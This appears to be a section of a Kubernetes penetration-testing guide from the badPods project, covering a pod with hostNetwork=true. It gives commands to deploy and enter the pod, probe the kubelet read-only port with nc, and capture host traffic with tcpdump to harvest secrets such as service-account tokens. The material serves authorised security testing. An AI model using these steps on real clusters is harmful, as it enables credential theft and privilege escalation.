## You can create a pod with only hostNetwork

If you only have `hostNetwork=true`, you can't get RCE on the host directly, but if your cross your fingers you might still find a path to cluster admin. 
The important things here are: 
* You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
* You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`

[pod-hostnetwork-only.yaml](pod-hostnetwork-only.yaml)


### Create pod
```bash 
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostnetwork-only.yaml   

# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork-only/pod-hostnetwork-only.yaml  
```

### Exec into pod 

```bash
kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
```

### Post Exploitation 
```bash
# Install tcpdump and sniff traffic 
# Note: If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes tcpdump, like https://hub.docker.com/r/corfr/tcpdump

apt update && apt install tcpdump 

# You now have a few options for next steps: 

# See if kubelet read only port (10255/tcp) is open on the nodes IP or the docker host IP

nc -zv 10.0.0.162 10255
Connection to 10.0.0.162 10255 port [tcp/*] succeeded!
nc -zv 172.17.0.1 10255
Connection to 172.17.0.1 10255 port [tcp/*] succeeded!

# If the read only port is open, run tcpdump recording the output to a file for a few minutes

#######################
#Warning: Sniffing on an interface with a lot of traffic can cause the interface to DROP traffic, which is not what you want in an production environment. I suggest picking one port at a time for your packet captures (e.g., 10255, 80, 8080, 3000 25, 23)
#Warning: Always run tcpdump with the -n flag. This turns off name resolution, and if you don't, the name resolution will bring the capture, and potentially the host, to its knees. 
#########################
tcpdump -ni [host or docker interface name] -s0 -w kubelet-ro.cap port 10255

#Stop it, and read the file with tcpdump and use the -A flag to only show the printable characters

tcpdump -ro kubelet-ro.cap -s0 -A

#Cross your fingers and look for secrets.  If you are lucky, you might even get a jwt token. If you are really lucky, that token might be associated with a service account in kube-system.


# Another option entirely: investigate local services
curl https://localhost:1234/metrics
```